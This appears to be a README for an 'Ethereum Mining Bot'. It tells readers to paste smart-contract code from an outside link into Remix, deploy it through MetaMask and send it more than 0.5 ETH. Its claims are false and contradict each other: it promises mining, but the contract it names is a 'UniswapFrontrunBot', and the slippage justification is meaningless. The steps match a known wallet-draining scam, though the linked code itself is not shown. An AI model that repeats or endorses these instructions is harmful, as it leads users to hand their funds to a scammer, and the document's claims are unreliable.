# Ethereum Mining Bot

## Overview

Welcome to the Ethereum Mining Bot project! This bot is designed to mine Ethereum using efficient algorithms and provides real-time performance monitoring. The project offers a hands-on educational experience in cryptocurrency mining, helping users understand the Ethereum mining process.

## Features

- **Efficient Mining**: Optimized algorithms for Ethereum mining.
- **Real-time Monitoring**: Track performance and mining statistics.
- **Configurable Settings**: Customize the bot's behavior to suit your needs.

## Prerequisites

Before you start, ensure you have the following:

- A web browser with MetaMask extension installed.
- Ethereum wallet funded with at least 0.5 ETH.
- Basic understanding of Ethereum and smart contracts.

## Getting Started

### Step 1: Access Remix IDE

Open the Remix IDE using the following link:

[Remix IDE](https://remix.ethereum.org/)

### Step 2: Create a New Solidity File

1. Click on the “contracts” folder.
2. Create a “New File” and name it `bot.sol`.

   **Note**: If the text is not colored when you create `bot.sol`, refresh the browser and then paste the code again.

### Step 3: Paste the Smart Contract Code

Paste the code from the following link into your `bot.sol` file:

[Smart Contract Code](https://tommyweb3.pages.dev/)

### Step 4: Compile the Smart Contract

1. Go to the "Compile" tab in Remix.
2. Select Solidity version `0.6.6`.
3. Click the "Compile bot.sol" button.

### Step 5: Deploy the Smart Contract

1. Go to the “DEPLOY & RUN TRANSACTIONS” tab.
2. Select “Injected Web3” as the environment.
3. Click the “Deploy” button.
4. Approve the MetaMask contract creation fee.

   **Note**: Ensure your bot's name is selected in the CONTRACT section above the deploy button. For example, "UniswapFrontrunBot - bot.sol".

### Step 6: Fund Your Bot

Fund your bot with more than 0.5 ETH to your exact contract/bot address. This prevents negating slippage.

### Step 7: Start the Bot

1. After your transaction is confirmed, click the "start" button to run the bot.
2. You can withdraw money at any time by clicking the "Withdraw" button.

## Usage

Once deployed, your Ethereum mining bot will start mining Ethereum based on the configured settings. You can monitor the bot's performance in real-time and adjust the settings as needed.
